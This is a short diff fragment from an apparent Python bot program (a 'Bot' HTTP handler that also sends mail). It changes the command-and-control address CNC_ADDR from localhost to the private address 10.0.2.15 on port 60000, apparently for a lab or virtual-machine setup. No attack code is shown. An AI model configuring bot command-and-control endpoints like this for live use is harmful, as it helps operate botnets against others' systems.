@@ -125,7 +125,7 @@ class Bot(BaseHTTPRequestHandler):
         smtp_server.quit()
 
 
-CNC_ADDR = '127.0.0.1'  # "10.0.2.15"
+CNC_ADDR = "10.0.2.15"  # '127.0.0.1'
 CNC_PORT = 60000
 
 
